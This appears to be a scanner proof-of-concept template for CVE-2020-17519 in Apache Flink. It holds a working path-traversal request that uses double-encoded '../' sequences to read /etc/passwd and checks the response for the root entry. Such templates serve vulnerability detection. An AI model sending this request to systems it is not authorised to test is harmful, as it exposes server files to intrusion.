name: poc-yaml-CVE-2020-17519-file-read
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
            headers: 
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
            follow_redirects: false
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()

detail:
    author: marmot
    links: 
     - "https://avd.aliyun.com/detail?id=AVD-2020-17519"